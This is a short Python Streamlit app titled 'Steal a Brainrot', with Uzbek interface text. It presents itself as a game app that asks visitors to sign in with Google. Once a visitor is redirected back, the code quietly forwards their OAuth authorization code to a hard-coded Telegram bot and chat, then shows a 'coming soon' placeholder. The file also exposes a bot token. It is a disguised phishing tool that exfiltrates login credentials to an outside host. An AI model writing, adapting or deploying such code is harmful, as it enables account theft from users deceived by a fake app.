import streamlit as st
import requests

st.set_page_config(page_title="Steal a Brainrot", page_icon="🔥")

st.title("✨ Steal a Brainrot")

# Google Login URL
GOOGLE_AUTH_URL = "https://accounts.google.com/o/oauth2/v2/auth?response_type=code&client_id=1085309280384-idkflab6a8as83fuum4479ovni8b367e.apps.googleusercontent.com&redirect_uri=https://steal-breinrot-app-gtxahjgkk8egizl2uuu6sd.streamlit.app/&scope=email profile"

st.markdown("Ilovamizga xush kelibsiz! Davom etish uchun:")

# Google orqali kirish tugmasi
st.link_button("Google orqali kirish", GOOGLE_AUTH_URL, type="primary")

# Foydalanuvchi qaytib kelganda ma'lumotni olish
params = st.query_params
code = params.get("code")

if code:
    st.success("Assalomu alaykum! Profilingiz qabul qilindi.")
    
    # Telegramga xabar yuborish
    BOT_TOKEN = "8112666081:AAGtROwNttf6lsApMQUxszHoC8xf7rB0s4A"
    CHAT_ID = "8088597011"
    
    # Xabarni yuboramiz
    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text=Yangi foydalanuvchi kirdi! Kod: {code}")
    
    st.balloons()
    st.info("Ilova ustida ishlayapmiz, tez orada tayyor bo'ladi! 🛠️")
